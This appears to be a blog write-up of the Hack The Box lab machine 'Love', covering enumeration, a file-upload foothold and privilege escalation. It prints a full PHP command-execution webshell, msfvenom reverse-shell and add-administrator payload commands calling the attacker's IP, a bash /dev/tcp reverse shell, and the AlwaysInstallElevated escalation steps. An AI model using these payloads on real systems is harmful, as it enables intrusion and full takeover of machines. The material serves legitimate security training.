---
title: "Love"
author: "Me"
date: "June 30, 2021"
output: html_document
---

# Love

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: easy (?/10)</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Windows</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_love_desc.png){: height="415px" width = 625px"}
</div>

**Ports/services exploited:** http\\
**Tools:** dirb, nmblookup, nbtscan, smbclient, smbmap, enum4linux, msfvenom, multi/handler\\
**Techniques:** SMB enumeration, SMB file transfer, file inclusion, reverse shell\\
**Keywords:** webshell, "Always Install Elevated" (PE) 


## 1. Services enumeration
{:style="color:DarkRed; font-size: 170%;"}

We'll start with the usual TCP scan and the flags *-sV* to have a verbose output, *-O* to enable OS detection, and *-sC* to enable the most common scripts scan:

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_love_nmap1.png)
</div>
<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_love_nmap2.png)
</div>

That's a lengthy output! This is often the case on Windows boxes... There's a web server on port 80, MSRPC on port 135, SMB on ports 139 and 445, https on port 443, MySQL (MariaDB) on port 3306 and finally another https on port 5000.\\
The scripts provide some information about SMB, such as the host's OS and the computer name on the network.\\
We will start by the simplest, that is browsing to the box' web page. The second thing we'll do is enumerate SMB.

## 2. Gaining a foothold
{:style="color:DarkRed; font-size: 170%;"}

Instead of browsing to the IP, let's add this latter to our hosts file:

````
sudo echo '10.10.10.239 love.htb' >> /etc/hosts
`````

Now we can use the host name:

<div class="img_container">
![website]({{https://jsom1.github.io/}}/_images/htb_love_site.png)
</div>

I tried to submit obvious credentials such as "admin/admin", to no avail. Let's use *dirb* to enumerate directories:

<div class="img_container">
![dirb]({{https://jsom1.github.io/}}/_images/htb_love_dirb.png)
</div>

We are not authorized to access most of those directories, but we have access to */admin* and its variations. Browsing at *love.htb/admin*, we see a very similar page to the previous one.\\
This time however, it requires a username instead of an ID. We once again try some common credentials (admin/admin), but still without luck.\\
At this point we might be tempted to bruteforce the login with *Hydra*, but it's not necessarily a good idea... The chances of success are relatively low, it can take a lot of time depending on the chosen wordlist and it's not very discrete.
In the worst case (I doubt it's the case here though), it could get our IP address banned. So, let's look at the other options we have.

One thing we can do is check if the application is vulnerable to SQL injections.
To test that, we simply input a " ' " in the username and password fields. If the application returns a weird error, it indicates that it doesn't properly sanitize users' inputs and might therefore be vulnerable.\\
Unfortunately it is not the case here. If it were the case or if we saw an URL of the form */something.php?**id=1***, we could use *sqlmap* to try SQLis.

Other than */admin*, dirb found a few other accessible directories: 

- */dist*: contains 3 sub-directories (*css, img and js*). Those latter contain *css*, *JavaScript* and *png* files. I went through some of them, but nothing interesting stood out.
- */images* (and */Images*): contains images, nothing useful.
- */includes*: contains seven php scripts. Some of them display a blank page. I *wget* them on Kali to see their content, but they were empty. The others have nothing interesting.
- */plugins*: nothing interesting.

We specified the *-r* flag in dirb, which prevents it from searching recursively. There are however subdirectories, for example */admin/includes*, which contains more scripts than the "normal" */includes*.
There is a script called *voters_modal.php* which allows the creation of new voters. I tried adding myself, but it didn't work...

Finally, I Googled the name of some scripts (like *ballot_modal* and *config_modal*) that appeared frequently. It appears it's from an application called **votesystem**, described as a "college voting site" (from the GitHub repo).
We can look if there's an existing exploit in Metasploit:

````
searchsploit votesystem
`````

Nothing. Now that we've enumerated this service quite well and didn't find anything, we can look at another one. Based on my little Windows CTF experience, SMB is often the way to a foothold.
Let's have a look at it. We'll perform a thorough enumation and start with the following tools:

- **nmblookup**: client program that allows command-line access to NetBIOS name service. It's used for resolving NetBIOS computer names into IP adddresses. We will use the *-A* flag which specifies a lookup by IP.
- **nbtscan**: scans a network or IP for NetBIOS name information
- **smbclient**: it's a client with an FTP-like interface. It is used to test connectivity to a Windows share, to transfer files and look at share names. The *-L* flag is to get a list of shares available on the host.
- **smbmap**: tool that allows users to enumerate share drives. We'll use the *-H* flag to specify the host's IP.

The results of those tools is the following:

<div class="img_container">
![SMB]({{https://jsom1.github.io/}}/_images/htb_love_smb.png)
</div>

No luck, none of them found anything. We saw in nmap's output that it ran the following NSE scripts for SMB enumeration: *smb-os-discovery*, *smb-security-mode*, *smb2-security-mode* and *smb2-time*.
There are however other available scripts, such as *smb-enum-shares*. Similarly to smbclient and smbmap, it tries to list available shares:

<div class="img_container">
![SMB nse]({{https://jsom1.github.io/}}/_images/htb_love_smbnse.png)
</div>

Although the script couldn't access the shares, they are still listed. We see the shares *ADMIN$*, *C$* and *IPC$*. Those are the defaut shares that are created when we create a CIFS (Common Internet File System) server. SMB is the modern concept of CIFS.
Anyways, I hoped we would find an accessible non default share...\\
There are also a variety of *nse* scripts which analyze vulnerabilities such as *ms07-029*, *ms06-025*, *conficker*, and so on. We can run all of them at once with the following command:

````
sudo nmap --script smb-vuln* <target IP>
`````

<div class="img_container">
![SMB vuln]({{https://jsom1.github.io/}}/_images/htb_love_smbvuln.png)
</div>

We see the server is not vulnerable to *ms10-054*, and we don't know about *ms10-061*. This time, the service running on port 5000 is identified as *upnp*.\\
I don't know this service, and Google indicates it stands for "Universal Plug and Play". 
It is a set of networking protocols that permits networked devices, such as personal computers, printers, Internet gateways, Wi-Fi access points and mobile devices to seamlessly discover each other's presence on the network and establish functional network services.\\
It's weird nmap now detects a different service, but that could be interesting later. Even though we find nothing on SMB, let's use a last tool for the sake of enumeration completeness. We will finish by using **enum4linux**, which is going to automate the manual process we just went through:

<div class="img_container">
![enum4linux]({{https://jsom1.github.io/}}/_images/htb_love_enum4l.png)
</div>

Of course it failed early... We get a useful information though: the server doesn't allow null sessions. Since this latter is often a necessary condition for expoitation, enu4linux aborted the rest of the scan.\\
SMB doesn't look to be our way in... 

Let's get back at the initial nmap scan to figure out our next move. 
I realize I may have overlooked something about http and didn't enumerate it properly. In particular, it's the first time I see "PHPSESSID: httponly flag not set". A quick search reveals that this indicates to the browser that the cookie can be accessed by client-side scripts. We'll check that, and also the versions of httpd (2.4.46) and php (7.3.27). Nothing there...\\
After re-rereading nmap's output, there's something I didn't see:

<div class="img_container">
![I'm blind]({{https://jsom1.github.io/}}/_images/htb_love_blind.png)
</div>

There is a subdomain! We add it to our host file:

````
sudo echo '10.10.10.239 staging.love.htb >> /etc/hosts
`````

And browse to it:

<div class="img_container">
![site 2]({{https://jsom1.github.io/}}/_images/htb_love_site2.png){: height="415px" width = 625px"}
</div>

There's not much on the home page, but here's the *Demo* tab:

<div class="img_container">
![site 3]({{https://jsom1.github.io/}}/_images/htb_love_site3.png)
</div>

Let's try to upload a file. I'll start a web server on Kali and try to download Linpeas.sh from the server (just to see what happens):

<div class="img_container">
![upload]({{https://jsom1.github.io/}}/_images/htb_love_upload.png)
</div>

I'm not sure about what it does exactly... Does it execute it? If it does, we could easily get a reverse shell... Being able to upload remote files into an application's running code is known as a **RFI** (remote file inclusion) vulnerability. This kind of vulnerability is commonly found in PHP applications. In order to exploit such a vulnerability, we must be able to not only execute code, but also to write our shell payload somewhere. Usually we can't simpy upload a file like here, but I won't explain how it works in other situations here. \\
Instead, let's upload something simpler to understand how it works. Atfter many tries, I used *msfvenom* to create a reverse shell with the following syntax:

````
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe > test.exe
`````

I then started a *multi/handler* and uploaded the file on the server. En error message appears: "This program cannot be run in DOS mode.". I Googled it and it appears this error occurs when we try to run a program intended for Windows inside DOS. DOS (Disk Operating System) is an OS that runs from a hard disk drive. It can also refer to a particular family of disk OS, most commonly MS-DOS (Microsoft-DOS).\\
Anyways, I didn't think about it so far, but we can inspect the page and try to find the definition of the function that scans the input. To do so we right click on the page, click *inspect element* and then go to the *Debugger* tab. There, we see that when we submit a file, this latter is passed to the *validateForm()* function. We also see its definition, which is the following:

````
function validateForm() {
   var x = document.forms["fileform"]["file"].value;
   if (x == "") {
   alert("Please enter a file url to scan");
   return false;
   }
}
``````

This script doesn't seem to do much. At this point I had to ask for help and I'm glad I did because I'd never have thought about doing that: nmap showed us a service on port 5000 (another web server, also recognised once as upnp). We're supposed to use this as follows:

<div class="img_container">
![creds]({{https://jsom1.github.io/}}/_images/htb_love_creds.png)
</div>

This way, we can access the other web server. I didn't show it in this write-up, but I tried to access it from my browser and got access denied. I don't know why, I just didn't think about trying that at all...\\
Great, we have credentials! We can go back to *love.htb/admin* and use them here to login. 

<div class="img_container">
![dashboard]({{https://jsom1.github.io/}}/_images/htb_love_db.png){: height="415px" width = 625px"}
</div>

We land on a dashboard. The menu contains different tabs, but all of them are empty. We see a user called *Neovic Devierte*. When clicking on the username, we see we can update the profile. A menu opens, and we can add a photo. Maybe we can add a file, so let's try to upload our *windows/meterpreter/reverse_tcp* payload. I don't show the output here because it didn't work... Is it because of the "DOS" error we saw earlier?\\
We can also try to use a webshell from */usr/share/webshells*. Because the application is written in PHP, we'll use */usr/share/webshells/php/php-reverse-shell.php*. We must modify two lines in the code:

````
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.6';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

`````

Then we set up a netcat listener:

````
sudo nc -nlvp 4444
`````

And we upload the file on the server:

<div class="img_container">
![PHP upload]({{https://jsom1.github.io/}}/_images/htb_love_uploadphp.png)
</div>
<div class="img_container">
![revsh fail]({{https://jsom1.github.io/}}/_images/htb_love_revshfail.png)
</div>

We see the target connected back to us, but the connection closed after an error... I googled this error and landed on a forum. Someone explains it's because *uname* doesn't exist on Windows, and it's better to use our own php reverse shell, something like the following:

````
<?php echo shell_exec($_GET[‘cmd’]).’ 2>&1’); ?>
``````

I tried to adapt the previous command to include a bash reverse shell (*$_GET['bash -i >& /dev/tcp/10.10.14.6/4444 0>&1']*), but it didn't work... Maybe we could upload our meterpreter payload file and use a command similar to the previous one to execute it?\\
Still in */usr/share/webshells/php*, there is another script, *simple-backdoor.php*. Its content is the following:

````
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
````

Let's try to upload that and see if we can issue commands. The usage says *http://target.com/simple-backdoor.php?cmd=\<cmd\>*. We have to find where the file was uploaded. After looking around, I found it (and also the other I uploaded) in the */images* directory (no surprise):

<div class="img_container">
![uploaded script]({{https://jsom1.github.io/}}/_images/htb_love_images.png)
</div>

Let's try to use it with the given syntax and execute a simple command such as *whoami*:

<div class="img_container">
![uploaded script]({{https://jsom1.github.io/}}/_images/htb_love_whoami.png)
</div>

The script works! We see we're in as *phoebe*. At this point we could probably read the *user.txt* flag directly, but we'll need a shell at some point so let's try that instead.\\
Since we can execute this command, we should also be able to execute a payload to get a reverse shell. The payload we'll use is:
 
````
 sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f exe -o reverseshell.exe
`````

We set up Metasploit's multi/handler, upload *reverseshell.exe* on the server and use the backdoor command to execute it:

<div class="img_container">
![uploaded script]({{https://jsom1.github.io/}}/_images/htb_love_exec.png)
</div>
<div class="img_container">
![uploaded script]({{https://jsom1.github.io/}}/_images/htb_love_revsh.png)
</div>
 
And finally, after hours of struggling, we've got a shell! I still don't understand how one of the payload I uploaded got executed... Maybe it was another player who did it? I guess I'll never know... Now we can simply grab the flag:
 
<div class="img_container">
![user flag]({{https://jsom1.github.io/}}/_images/htb_love_user.png)
</div>

## 3. Privilege escalation
{:style="color:DarkRed; font-size: 170%;"}

Now that we have a foothold, we start enumerating once again... As usual, the first thing I do is check the user permissions. The Windows equivalent of *sudo -l* is *whoami /priv*:

<div class="img_container">
![user perms]({{https://jsom1.github.io/}}/_images/htb_love_sudol.png)
</div>
 
I have already seen this but never exploited it. Let's upload WinPeas on the target. For the sake of exercising, we'll use SMB to transfer it from Kali to Windows.\\
We'll use the tool *Impacket* (it should be installed, *sudo apt install python-impacket* otherwise) to create an SMB share on our Kali machine, and connect to that share from the compromised Windows host. We will then be able to copy files into the shared folder on either host, and access them on the other host.\\
The command to start the server is the following:
 
````
sudo impacket-smbserver <shareName> <sharePath>
`````
Sharename can be anything we want, and sharePath is the folder we want to share. In my case, I created a directory *tools* on Kali, and placed *winPEASany.exe* within it. We can then share this directory as follows:

````
sudo impacket-smbserver smb home/kali/tools
`````

Then from Windows, we use the *net use* built in command to list the connected shares, and we connect to it. Finally, we can list the files on the share. All those commands are the following:
 
````
C:\>net use
C:\>net use \\10.10.14.6\smb
C:\>dir \\10.10.14.6\smb
``````

<div class="img_container">
![share]({{https://jsom1.github.io/}}/_images/htb_love_share.png)
</div>
 
 
We transfer the file:
 
````
C:\>copy \\10.10.14.6\smb\winPEASany.exe .
`````

<div class="img_container">
![copy]({{https://jsom1.github.io/}}/_images/htb_love_copy.png)
</div>

As the last time I tried on another Windows box, using this script makes our session crash... I have no idea why, and it's annoying because most people on the forum found the PE vector using it... After a bit of manual enumeration, I had to ask for the solution. We're using "Always Install Elevated". I found an article (https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated) and we can check for the vulnerability with the following commands:
 
````
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
``````

The ouput of both commands must be "1" to be exploitable. If it is the case, we have 2 possibilities:

1) Generate a payload to add user to admin group: *sudo msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi*\\
2) Generate a reverse shell payload: *sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST <IP> LPORT <PORT> -f msi -o reverse.msi*.
 
Let's try the second one:
 
````
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST 10.10.14.6 LPORT 5555 -f msi -o reverse.msi
``````

We upload this file onto the server the same way we uploaded the previous ones and set up a netcat listener on port 5555. We use our backdoor in the browser to execute it:
 
````
love.htb/images/simple-backdoor.php?cmd=reverse.msi
`````

If everything works as expected, we should get a reverse shell as administrator:
 
<div class="img_container">
![root]({{https://jsom1.github.io/}}/_images/htb_love_root.png)
</div>

And we can grab the flag! I don't see the link between "Always Install Elevated" and our payload. I spent too many hours on this machine and don't want to spend more time on it, but I guess it has something to do with executing a *.msi* file. From Google, we see that "MSI is an installer package file format used by Windows. Its name comes from the program's original title, Microsoft Installer, which has since changed to Windows Installer".\\
That's probably it, it must execute our file with nt\system permissions.
 
<div class="img_container">
![pwn]({{https://jsom1.github.io/}}/_images/htb_love_pwn.png){: height="300px" width = 400px"}
</div>

<ins>**My thoughts**</ins>
 
As usual, I fell into many rabbit holes. However, that was a good opportunity to practice. In particular, it was refreshing to perform a thorough SMB enumeration and use it for file sharing.\\
I struggled connecting the dots in this box. The image file inclusion "vulnerability" was nice. It's very likely possible to force the uploaded file to have a *.png* or *.jpeg* extension, but fortunately for us it wasn't the case here.

